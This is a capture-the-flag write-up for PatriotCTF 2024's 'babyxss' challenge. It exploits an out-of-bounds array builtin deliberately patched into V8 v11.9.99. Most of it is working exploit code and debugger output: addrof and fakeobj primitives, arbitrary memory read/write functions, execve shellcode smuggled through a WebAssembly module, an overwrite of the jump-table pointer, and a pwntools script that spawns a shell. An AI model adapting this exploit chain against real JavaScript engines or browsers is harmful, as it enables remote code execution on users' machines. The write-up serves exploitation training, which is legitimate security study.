## Writeup

### Misc

+ Artifact: V8
+ Version: v11.9.99
+ Time: 2024-Sep-22
+ Description: Manually introduced oob vulnerability
+ CTF: PatriotCTF 2024
+ Challenge Name: babyxss

### Vulnerability

The challenge manully introduced a vulnerability that allows us to achieve a out-of-bound read/write of an array.

```
+transitioning javascript builtin ArrayPrototypeOob(js-implicit context: NativeContext, receiver: JSAny)(length: JSAny): JSAny {
+
+  try {
+    const array: JSArray = Cast<JSArray>(receiver) otherwise Bad;
+    array.length = Cast<Smi>(length) otherwise Bad;
+  } label Bad {
+
+  }
+  return receiver;
+}
```

With this vulnerability, we can read/write the memory after an array by setting its length to arbitrary long.

```
V8 version 11.9.99
d8> let a = [1.1]
undefined
d8> a.oob(10)
[1.1, , , , , , , , , ]
d8> a[9]
2.502521315148532e+262
d8> 
```

### Primitives: addrof and fakeobj

#### addrof 

To get the address of arbitrary object, e.g., `test_obj`, we first create an array of float, i.e., `fl_arr`, for address leaking and then create an array of object, i.e., `obj_arr`. Since the `obj_arr` is created after the `fl_arr`, it will be placed at the higher adjacent address space of `fl_arr`. In this case, we can leak its pointer through the out-of-bound index access of `fl_arr` array.

```
var fl_arr = [1.1];
var temp_obj = {"A":1};
var obj_arr = [temp_obj];

fl_arr.oob(100);

let test_obj = {"A":2};
obj_arr[0] = test_obj;
%DebugPrint(obj_arr);
%DebugPrint(fl_arr);
%SystemBreak();
```

```
gef➤  x/64xw 0x1ca700045df5-1
0x1ca700045df4: 0x00000925      0x00000002      0x9999999a   <-- fl_arr[0]   0x3ff19999
0x1ca700045e04  <-- fl_arr: 0x0018d429      0x00000219      0x00045df5      0x000000c8
0x1ca700045e14: 0x00194c41      0x00000219      0x00000219      0x00000002
0x1ca700045e24: 0x00000129      0x00010001      0x00000000      0x00000279
0x1ca700045e34: 0x00002895      0x00000084      0x00000002      0x00000089
0x1ca700045e44: 0x00000002      0x00045e5d      0x0018d4a9      0x00000219
0x1ca700045e54: 0x00045e41 <-- test_obj 0x00000002      0x00194c41      0x00000219
0x1ca700045e64: 0x00000219      0x00000004      0x00000335      0x00045df5
0x1ca700045e74: 0x000000c8      0x00000515      0x00000002      0x00045df5
0x1ca700045e84: 0x00000000      0x00000515      0x00000002      0x000000c8
0x1ca700045e94: 0x00000000      0x00000515      0x00000002      0x00000000
0x1ca700045ea4: 0x000000c8      0x00000515      0x00000002      0x00045df5
0x1ca700045eb4: 0x000000c8      0x00000515      0x00000002      0x000000c8
0x1ca700045ec4: 0x00000000      0x0000058d      0x00000003      0x00000002
0x1ca700045ed4: 0x00003863      0x0000058d      0x00000003      0x00000004
0x1ca700045ee4: 0x38637830      0x00000000      0x00000000      0x00000000
0x1ca700045ef4: 0x00000000      0x00000000      0x00000000      0x00000000
```

From the memory layout, we can tell that the ptr of `test_obj` has been placed at `fl_arr[9]`. Therefore, we can create the following `addrof` function.

```
var fl_arr = [1.1];
var temp_obj = {"A":1};
var obj_arr = [temp_obj];
fl_arr.oob(100);

function addrof(obj) {
  obj_arr[0] = obj;
  let addr = ftoi(fl_arr[9]) >> 32n;
  obj_arr[0] = temp_obj;
  return addr;
}
```

#### fakeobj

To fake an object reference of arbitrary address, we can use the out of bound write to overwrite the ptr of `obj_arr[0]` to that address and return the reference back. 

```
function fakeobj(addr) {
  const tmp = ftoi(fl_arr[9]) & 0xffffffffn;
  fl_arr[9] = itof(tmp + (addr << 32n));
  return obj_arr[0];
}
```

### Arbitrary Read & Write Primitives

After we achieving the `addrof` and `fakeobj`, we can use the same techniques used before to achieve the arbitrary address read and write primitives. 

https://github.com/jackfromeast/browser-dojo/tree/main/v8/2019-star-ctf-oob-v8#arbitrary-read--write-primitives

```
function arbitray_addr_read(addr) {
  arr_float[0] = map_arr_float;
  arr_float[1] = itof(0x0000000200000000n + addr - 0x8n);
  const fake = fakeobj(addrof(arr_float) - 0x10n);
  return ftoi(fake[0]);
}

function arbitray_addr_write(addr, val) {
  arr_float[0] = map_arr_float;
  arr_float[1] = itof(0x0000000200000000n + addr - 0x8n);
  const fake = fakeobj(addrof(arr_float) - 0x10n);
  fake[0] = val;
}
```

We can use the following functions to check the functionality of our primitives.

```
function arbitrary_addr_read_check(){
  let arr_float_test = [1.1, 2.2];                    // 0x3ff199999999999a, 0x400199999999999a
  let test_addr = addrof(arr_float_test);

  let val_1 = arbitray_addr_read(test_addr-0x10n);    // should equal to 0x3ff199999999999a
  let val_2 = arbitray_addr_read(test_addr-0x8n);     // should equal to 0x400199999999999a
  console.log("[+] Read value1:" + hex(val_1));
  console.log("[+] Read value2:" + hex(val_2));

  if (val_1 === 0x3ff199999999999an && val_2 === 0x400199999999999an){
    console.log("[+] Arbitrary address read success!");
  }
}

function arbitrary_addr_write_check(){
  let arr_float_test = [1.1, 2.2];                    // change 1.1 to 3.3, 2.2 to 4.4
  let test_addr = addrof(arr_float_test);
  
  arbitray_addr_write(test_addr-0x10n, 3.3);
  arbitray_addr_write(test_addr-0x8n, 4.4);

  let val_1 = arbitray_addr_read(test_addr-0x10n);    // should equal to 0x400a666666666666
  let val_2 = arbitray_addr_read(test_addr-0x8n);     // should equal to 0x401199999999999a
  console.log("[+] Read value1:" + hex(val_1));
  console.log("[+] Read value2:" + hex(val_2));

  if (val_1 === 0x400a666666666666n && val_2 === 0x401199999999999an){
    console.log("[+] Arbitrary address write success!");
  }
}
```

### Get Shell

Techniques like copying shellcode to the start address of the RWX page (as described in this writeup) no longer work in this version of V8. The key reason is that the `backing_store_pointer` of an `ArrayBuffer` only stores the lower 32 bits of the pointer due to V8's pointer compression. The higher 32 bits are retrieved from the heap object, as all JavaScript values are stored within the same segment. This limitation prevents us from accessing addresses outside of the V8 heap, such as the RWX page.

However, the starting address of RWX page still serves a jump table which will be jumped to when we call a WebAssembly exposed function. To avoid writing the shellcode to that address, we instead first write the shellcode in the JITed WebAssembly code directly and overwrite the jump table pointer to the start of the shellcode. This time, we are not writing to the RWX page directly but overwrite the jump table pointer stored in the V8 heap.

```
var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 1,
  7, 19, 2, 7, 116, 114, 105, 103, 103, 101, 114, 0, 0, 5, 115, 104, 101, 108,
  108, 0, 1, 10, 99, 2, 3, 0, 1, 11, 93, 0, 65, 0, 66, 212, 188, 197, 249, 143,
  146, 228, 245, 16, 55, 3, 0, 65, 8, 66, 186, 161, 128, 128, 128, 128, 228,
  245, 6, 55, 3, 0, 65, 16, 66, 177, 128, 191, 168, 128, 146, 228, 245, 6, 55,
  3, 0, 65, 24, 66, 184, 247, 128, 128, 128, 128, 228, 245, 6, 55, 3, 0, 65, 32,
  66, 212, 190, 197, 177, 159, 198, 244, 245, 6, 55, 3, 0, 65, 40, 66, 143, 138,
  172, 247, 143, 146, 164, 200, 144, 127, 55, 3, 0, 11,
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shell = wasm_instance.exports.shell;
var trigger = wasm_instance.exports.trigger;

var rwx_page_addr = arbitrary_addr_read(addrof(wasm_instance)+0x50n);
console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));
%DebugPrint(wasm_instance);
```

The output:
```
[+] RWX Wasm page addr: 0x1a032f8f6000
DebugPrint: 0x22b000195925: [WasmInstanceObject] in OldSpace
 - map: 0x22b00018f819 <Map[224](HOLEY_ELEMENTS)> [FastProperties]
 ...
 - jump_table_start: 0x1a032f8f6000
 - data_segment_starts: 0x22b000000f59 <ByteArray[0]>
 - data_segment_sizes: 0x22b000000f59 <ByteArray[0]>
 - element_segments: 0x22b000000219 <FixedArray[0]>
 - hook_on_function_call_address: 0x5a98b3665989
 - tiering_budget_array: 0x5a98b36a6a50
 - memory_bases_and_sizes: 0x22b0000471dd <ByteArray[16]>
 - break_on_entry: 0
 - properties: 0x22b000000219 <FixedArray[0]>
 - All own properties (excluding elements): {}
```

```
gef➤  x/64xw 0x22b000195925-1 + 0x50 <-- wasm_instance address + 0x50
0x22b000195974: 0x2f8f6000      0x00001a03   <--  RWX Page  0xb36461f0      0x00005a98
0x22b000195984: 0xb36461e8      0x00005a98      0xb3646208      0x00005a98
0x22b000195994: 0xb3646200      0x00005a98      0xb3646130      0x00005a98
0x22b0001959a4: 0xb3665989      0x00005a98      0xb36a6a50      0x00005a98
0x22b0001959b4: 0x000471dd      0x00000f59      0x00000f59      0x00000219
0x22b0001959c4: 0x00047111      0x000472a1      0x00182291      0x000471d1
0x22b0001959d4: 0x00000251      0x00000251      0x00000251      0x00000219
0x22b0001959e4: 0x00000219      0x00000251      0x000471c1      0x00047295
0x22b0001959f4: 0x00000219      0x00000219      0x00000200      0x00000251
0x22b000195a04: 0x0018fa75      0x00000219      0x00000219      0x0004720d
0x22b000195a14: 0xfffffffe      0x00000000      0x0004727d      0x00000061
0x22b000195a24: 0x28021010      0x0d00080e      0x084007ff      0x0018a659
0x22b000195a34: 0x0018a585      0x0004724d      0x00000229      0x00000add
0x22b000195a44: 0x00000000      0x00001f35      0x00040440      0xffffffff
0x22b000195a54: 0x00000251      0x00000006      0x00000251      0x00000251
0x22b000195a64: 0x00000251      0x00000061      0x4e000006      0x0d00010f
gef➤  
```

**Shellcode (credited to @unvariant)**

The raw shellcode:

```
bits 64
default rel

push rsp
pop rsi
xor edi, edi
nop
nop
db 0xeb, 0x18-8

mov edx, 16
nop
db 0xeb, 0x0e-8

xor eax, eax
syscall
nop
nop
db 0xeb, 0x0e-8

mov eax, dword 0x3b
nop
db 0xeb, 0x0e-8

push rsp
pop rdi
xor esi, esi
xor edx, edx
db 0xeb, 0x0e-8

syscall
db 0xeb, 0xfe
nop
nop
nop
nop
```

The WebAssemly code to store the above shellcode to the memory:
```
(module
  (memory 1)
  (func (export "trigger")
    nop
  )
  (func (export "shell")
    i32.const 0
    i64.const 0x10eb9090ff315e54
    i64.store
    i32.const 8
    i64.const 0x6eb9000000010ba
    i64.store
    i32.const 16
    i64.const 0x6eb9090050fc031
    i64.store
    i32.const 24
    i64.const 0x6eb900000003bb8
    i64.store
    i32.const 32
    i64.const 0x6ebd231f6315f54
    i64.store
    i32.const 40
    i64.const 0x90909090feeb050f
    i64.store
  )
)
```

The full exploitation:

```
var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 1,
  7, 19, 2, 7, 116, 114, 105, 103, 103, 101, 114, 0, 0, 5, 115, 104, 101, 108,
  108, 0, 1, 10, 99, 2, 3, 0, 1, 11, 93, 0, 65, 0, 66, 212, 188, 197, 249, 143,
  146, 228, 245, 16, 55, 3, 0, 65, 8, 66, 186, 161, 128, 128, 128, 128, 228,
  245, 6, 55, 3, 0, 65, 16, 66, 177, 128, 191, 168, 128, 146, 228, 245, 6, 55,
  3, 0, 65, 24, 66, 184, 247, 128, 128, 128, 128, 228, 245, 6, 55, 3, 0, 65, 32,
  66, 212, 190, 197, 177, 159, 198, 244, 245, 6, 55, 3, 0, 65, 40, 66, 143, 138,
  172, 247, 143, 146, 164, 200, 144, 127, 55, 3, 0, 11,
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shell = wasm_instance.exports.shell;
var trigger = wasm_instance.exports.trigger;

/* Trigger jit compiler */
shell();

/* Get address of rwx page, and overwrite it with the offset to our smuggled shellcode */
var rwx_page_addr = arbitray_addr_read(addrof(wasm_instance)+0x50n);
console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));
arbitray_addr_write(addrof(wasm_instance)+0x50n, itof(rwx_page_addr + 0x75dn));

/* Shellcode from @unvariant reads from stdin the command, therefore solve.py sends /bin/sh\x00
 * NOTE: read does not appear to block, send /bin/sh\x00 BEFORE it reads (aka when console.log is executed) */
console.log("SEND");
trigger();
```

```
// solve.py
from pwn import *

sh = process(['../challenge/d8', './test.js'])
sh.sendlineafter(b"SEND", b'/bin/sh\x00')
sh.interactive()
```